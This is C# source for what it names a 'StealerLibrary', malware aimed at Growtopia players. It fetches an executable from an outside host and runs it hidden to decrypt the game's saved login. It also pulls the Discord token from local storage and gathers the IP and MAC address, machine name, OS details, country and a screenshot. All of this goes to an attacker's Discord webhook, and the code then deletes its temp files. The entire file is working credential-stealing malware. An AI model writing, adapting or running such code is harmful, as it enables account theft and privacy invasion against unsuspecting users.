using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace StealerLibrary
{
    public class Growtopia
    {
        #region Stealer
        public static void Stealer(string WebhookUrl, string ProfilePictureUrl, string WebhookName, bool LastWorldBool, bool MACAddressBool, bool IPAddressBool, bool Token, bool Username, bool PCName, bool OSInformationBool, bool CountryBool, bool Screenshot)
        {
            try
            {
                DeleteTempFiles();
                GetGrowIDPass();
                string LastWorld = GetLastWorld(SaveDatPath());
                string GrowID = File.ReadAllText(Path.GetTempPath() + "\\logfile.txt");
                string Password = File.ReadAllText(Path.GetTempPath() + "\\log.txt");
                string IPAddress = GetIPAddress();
                string GetToken = DiscordToken();
                string OSInfo = OSInformation();
                string Culture = CultureInfo.CurrentCulture.EnglishName;
                string GetCountry = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
                string screen = Path.GetTempPath() + "screen.jpg";
                String MACAddress = NetworkInterface
               .GetAllNetworkInterfaces()
               .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
               .Select(nic => nic.GetPhysicalAddress().ToString())
               .FirstOrDefault();

                Webhook hook = new Webhook(WebhookUrl);
                hook.Name = WebhookName;
                hook.ProfilePictureUrl = ProfilePictureUrl;
                string details;
                details = "GrowID: " + GrowID + Environment.NewLine + "Password: " + Password + Environment.NewLine;
                if (LastWorldBool)
                {
                    details += "Last World: " + LastWorld + Environment.NewLine;
                }
                if (MACAddressBool)
                {
                    details += "MAC Address: " + MACAddress + Environment.NewLine;
                }
                if (IPAddressBool)
                {
                    details += "IP Address: " + IPAddress + Environment.NewLine;
                }
                if (Token)
                {
                    details += "Discord Token: " + GetToken + Environment.NewLine;
                }
                if (Username)
                {
                    details += "User Name: " + Environment.UserName + Environment.NewLine;
                }
                if (PCName)
                {
                    details += "Machine Name: " + Environment.MachineName + Environment.NewLine;
                }
                if (OSInformationBool)
                {
                    details += "OS Information: " + OSInfo + Environment.NewLine;
                }
                if (CountryBool)
                {
                    details += "Country: " + GetCountry + " / " + Culture + Environment.NewLine;
                }
                if (Screenshot)
                {
                    TakeScreenshot();
                    details += "Screenshot:";
                    hook.SendMessage(details, screen);
                    DeleteTempFiles();
                    return;
                }
                hook.SendMessage(details);
                DeleteTempFiles();
            }
            catch
            {
            }
        }
        #endregion

        #region Delete Temp Files
        static void DeleteTempFiles()
        {
            try { File.Delete(Path.GetTempPath() + @"\logfile.txt"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\log.txt"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\savedec.exe"); } catch { }
            try { File.Delete(Path.GetTempPath() + @"\screen.jpg"); } catch { }
        }
        #endregion

        #region Take Screenshot
        public static void TakeScreenshot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save(System.IO.Path.GetTempPath() + "screen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
            }
        }
        #endregion

        #region Get IP Address
        public static string GetIPAddress()
        {
            try
            {
                string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
                var externalIp = IPAddress.Parse(externalIpString);
                return externalIp.ToString();
            }
            catch
            {
                return "N/A";
            }
        }
        #endregion

        #region Get GrowID and Password
        public static void GetGrowIDPass()
        {
            try
            {
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat"))
                {
                    WebClient wc = new WebClient();

                    wc.DownloadFile("http://anarchy.5v.pl/savedec.exe", Path.GetTempPath() + "\\savedec.exe");

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = Path.GetTempPath() + "\\savedec.exe",
                        WindowStyle = ProcessWindowStyle.Hidden
                    }).WaitForExit();
                }
            }
            catch
            {
            }
        }
        #endregion

        #region Save.dat Path
        public static string SaveDatPath()
        {
            string text = "";
            try
            {
                RegistryKey registryKey;
                if (Environment.Is64BitOperatingSystem)
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
                    string text2 = (string)registryKey.GetValue("path");
                    if (Directory.Exists(text2))
                    {
                        string text3 = File.ReadAllText(text2 + "\\save.dat");
                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
                        {
                            text = text2 + "\\save.dat";
                            return text;
                        }
                        else
                        {
                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                            return text;
                        }
                    }
                    else
                    {
                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                        return text;
                    }
                }
                catch
                {
                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                    return text;
                }
            }
            catch
            {
                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
                return text;
            }
        }
        #endregion

        #region Get Last World
        public static string GetLastWorld(string path)
        {
            try
            {
                byte[] array = File.ReadAllBytes(path);
                string @string = Encoding.ASCII.GetString(array);
                string lastworld;
                try
                {
                    string text = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 9]));
                    lastworld = text;
                }
                catch
                {
                    lastworld = "N/A";
                }
                return lastworld;
            }
            catch
            {
                string lastworld = "N/A";
                return lastworld;
            }
        }
        #endregion

        #region Discord Webhook Class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public string Name { get; set; }
            public string ProfilePictureUrl { get; set; }

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content, string file = null)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new StringContent(Name), "username");
                data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
                data.Add(new StringContent(content), "content");
                if (file != null)
                {
                    if (!File.Exists(file))
                        throw new FileNotFoundException();

                    byte[] bytes = File.ReadAllBytes(file);

                    data.Add(new ByteArrayContent(bytes), "screen.jpg", "screen.jpg");

                }
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Get Discord Token
        public static string DiscordToken()
        {
            string result;
            try
            {
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!dotldb(ref text))
                {
                    dotlog(ref text);
                }
                Thread.Sleep(100);
                string text2 = tokenx(text, text.EndsWith(".log"));
                if (text2 == "")
                {
                    text2 = "N/A";
                }
                result = text2;
            }
            catch
            {
                result = "N/A";
            }
            return result;
        }
        private static bool dotldb(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {

                        if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".ldb");
                        }
                    }
                    result = stringx.EndsWith(".ldb");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            string result;
            try
            {
                if (stringx.Contains(".log"))
                {
                    stringx = Path.GetDirectoryName(stringx) + "\\LogCopy.txt";
                }
                byte[] bytes = File.ReadAllBytes(stringx);
                string @string = Encoding.UTF8.GetString(bytes);
                string text = "";
                string text2 = @string;
                while (text2.Contains("oken"))
                {
                    string[] array = IndexOf(text2).Split(new char[]
                    {
                        '"'
                    });
                    text = array[0];
                    text2 = string.Join("\"", array);
                    if (boolx && text.Length == 59)
                    {
                        break;
                    }
                }
                result = text;
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
            }
            catch
            {
                if (stringx.Contains("LogCopy.txt"))
                {
                    File.Delete(stringx);
                }
                result = "";
            }
            return result;
        }
        public static string dotlog(ref string stringx)
        {
            bool result;
            try
            {
                if (Directory.Exists(stringx))
                {
                    foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                    {
                        bool LogText = ReadLogFile(fileInfo.FullName);
                        if (fileInfo.Name.EndsWith(".log") && LogText)
                        {
                            stringx += fileInfo.Name;
                            return stringx.EndsWith(".log").ToString();
                        }
                    }
                    result = stringx.EndsWith(".log");
                }
                else
                {
                    result = false;
                }
            }
            catch
            {
                result = false;
            }
            return result.ToString();
        }
        static bool ReadLogFile(string path)
        {
            string newpath = Path.GetDirectoryName(path) + "\\LogCopy.txt";
            File.Copy(path, newpath, true);
            bool Result = File.ReadAllText(newpath).Contains("oken");
            return Result;
        }
        private static string IndexOf(string stringx)
        {
            string result;
            try
            {
                string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
                {
                    '"'
                });
                List<string> list = new List<string>();
                list.AddRange(array);
                list.RemoveAt(0);
                array = list.ToArray();
                result = string.Join("\"", array);
            }
            catch
            {
                result = null;
            }
            return result;
        }
        #endregion

        #region OS Information
        static string OSInformation()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
            foreach (ManagementObject wmi in searcher.Get())
            {
                try
                {
                    return ((string)wmi["Caption"]).Trim() + ", " + (string)wmi["Version"] + ", " + (string)wmi["OSArchitecture"];
                }
                catch { }
            }
            return "N/A";
        }
        #endregion
    }
}
